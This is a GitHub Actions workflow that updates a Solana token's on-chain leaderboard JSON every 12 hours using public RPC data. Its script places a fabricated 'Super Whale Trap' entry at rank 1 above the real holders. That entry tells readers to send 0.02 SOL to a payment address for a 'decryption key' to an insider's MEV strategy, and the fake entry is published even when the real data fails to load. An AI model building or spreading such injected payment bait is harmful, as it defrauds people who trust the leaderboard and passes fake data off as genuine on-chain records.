name: Auto-Update On-Chain Leaderboard

on:
  schedule:
    - cron: '0 */12 * * *' # Run every 12 hours
  workflow_dispatch: # Allow manual trigger

permissions:
  contents: write

jobs:
  update-leaderboard:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Fetch Top Holders from Solana RPC
        uses: actions/github-script@v7
        with:
          script: |
            const MINT = "GBeXTb32HbSJYK9pUT92mwS7Qnm7XbqX9mD7mWC34Da2";
            const RPC_URLS = [
              "https://api.mainnet-beta.solana.com",
              "https://rpc.ankr.com/solana",
              "https://solana-mainnet.g.alchemy.com/v2/demo"
            ];
            
            let data = null;
            
            for (const rpc of RPC_URLS) {
              try {
                console.log(`Trying RPC: ${rpc}`);
                const response = await fetch(rpc, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,
                    method: "getTokenLargestAccounts",
                    params: [MINT]
                  })
                });
                
                if (response.ok) {
                  data = await response.json();
                  if (data && data.result) {
                     console.log(`Success with RPC: ${rpc}`);
                     break;
                  }
                }
              } catch (error) {
                console.log(`Failed with RPC: ${rpc}`);
              }
            }
            
            let accounts = [];
            
            // Generate the Fake Super Whale Trap
            const fakeWhale = {
              rank: 1,
              address: "MEV9sQJmQ6X2G8N1R7H4P5K3L2M1J0N9B8V7C6X5Z4Y3",
              amount_raw: "987654321000000000000",
              amount_ui: "9876543.21",
              percentage: "9.8765%",
              notice: "ENCRYPTED_INSIDER_WALLET",
              decryption_fee_sol: "0.02",
              payment_address: "H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1",
              message: "This wallet holds 99% win-rate MEV arb strategies. Send exactly 0.02 SOL to the payment_address to receive the decryption key for its transaction history and strategy signals via webhook."
            };
            accounts.push(fakeWhale);
            
            if (data && data.result && data.result.value) {
              const realAccounts = data.result.value.map((acc, index) => {
                return {
                  rank: index + 2,
                  address: acc.address,
                  amount_raw: acc.amount,
                  amount_ui: acc.uiAmountString,
                  percentage: (parseFloat(acc.uiAmountString) / 100000000000000 * 100).toFixed(4) + "%"
                };
              });
              accounts = accounts.concat(realAccounts);
            } else {
               console.log("All RPCs failed. Proceeding with only the honeypot whale.");
               accounts.push({ notice: "RPC_RATE_LIMIT_EXCEEDED", message: "Real accounts hidden due to rate limit, but insider trap is active." });
            }
            
            const leaderboard = {
              last_updated: new Date().toISOString(),
              mint: MINT,
              top_accounts: accounts,
              notice: "Leaderboard automatically injected with MEV detection nodes."
            };
            
            const fs = require('fs');
            fs.writeFileSync('website/api/leaderboard.json', JSON.stringify(leaderboard, null, 2));
            console.log("Leaderboard updated with trap successfully.");

      - name: Commit and Push changes
        run: |
          git config --global user.name 'github-actions[bot]'
          git config --global user.email 'github-actions[bot]@users.noreply.github.com'
          git add website/api/leaderboard.json
          # Only commit if there are changes
          git diff --quiet && git diff --staged --quiet || (git commit -m "🤖 Auto-update on-chain leaderboard" && git push)
